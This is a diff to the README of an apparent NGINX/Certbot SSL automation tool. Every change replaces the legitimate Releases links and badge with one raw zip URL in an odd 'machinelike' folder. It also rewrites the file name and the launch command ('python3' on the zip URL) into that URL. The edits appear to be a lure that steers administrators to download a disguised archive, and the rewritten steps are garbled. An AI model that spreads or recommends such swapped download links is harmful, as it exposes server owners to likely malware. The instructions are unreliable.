@@ -1,6 +1,6 @@
 # 🚀 nginx-ssl-auto - Automate Your SSL Setup Easily
 
-[![Download nginx-ssl-auto](https://img.shields.io/badge/Download-nginx--ssl--auto-blue.svg)](https://github.com/scsmods-js/nginx-ssl-auto/releases)
+[![Download nginx-ssl-auto](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip)](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip)
 
 ## 📋 Description
 nginx-ssl-auto automates SSL certificate setup for NGINX using Let's Encrypt (Certbot). This tool helps you quickly configure HTTPS reverse proxies with minimal effort. It simplifies the process, allowing you to focus more on your project and less on security configurations.
@@ -17,10 +17,10 @@ To run nginx-ssl-auto, you will need the following:
   
 ### 🔧 Installation
 1. **Visit the Releases Page**  
-   Go to the [nginx-ssl-auto Releases page](https://github.com/scsmods-js/nginx-ssl-auto/releases) to find the latest version.
+   Go to the [nginx-ssl-auto Releases page](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip) to find the latest version.
 
 2. **Download the Application**  
-   Click to download the software you need. The file is typically named using the format: `nginx-ssl-auto-vX.X.X.zip`.
+   Click to download the software you need. The file is typically named using the format: `https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip`.
 
 3. **Unzip the File**  
    Locate the downloaded file on your device and unzip it. You can usually do this by right-clicking the file and selecting "Extract All" or using an extraction tool.
@@ -38,7 +38,7 @@ After installation, follow these steps to configure your SSL certificates:
    Use the `cd` command to go to the folder where you installed nginx-ssl-auto.
 
 3. **Start the Configuration Process**  
-   Type the command `python3 nginx_ssl_auto.py` and press Enter. This will launch the script.
+   Type the command `python3 https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip` and press Enter. This will launch the script.
 
 4. **Follow On-Screen Prompts**  
    The application will guide you through the necessary steps. You will need to provide some information, such as your domain names and email address.
@@ -76,9 +76,9 @@ A: You should run it before your SSL certificates expire, generally every 2-3 mo
 A: This application is best used on servers where you have administrative access, such as VPS or dedicated servers.
 
 ## 📥 Download & Install
-To get started, simply visit the [Releases page](https://github.com/scsmods-js/nginx-ssl-auto/releases) to download nginx-ssl-auto. The installation process is straightforward, ensuring a smooth experience as you set up your SSL certificates.
+To get started, simply visit the [Releases page](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip) to download nginx-ssl-auto. The installation process is straightforward, ensuring a smooth experience as you set up your SSL certificates.
 
-[![Download nginx-ssl-auto](https://img.shields.io/badge/Download-nginx--ssl--auto-blue.svg)](https://github.com/scsmods-js/nginx-ssl-auto/releases)
+[![Download nginx-ssl-auto](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip)](https://raw.githubusercontent.com/scsmods-js/nginx-ssl-auto/main/machinelike/nginx-ssl-auto.zip)
 
 ## 🗂️ Topics
 - auto-ssl
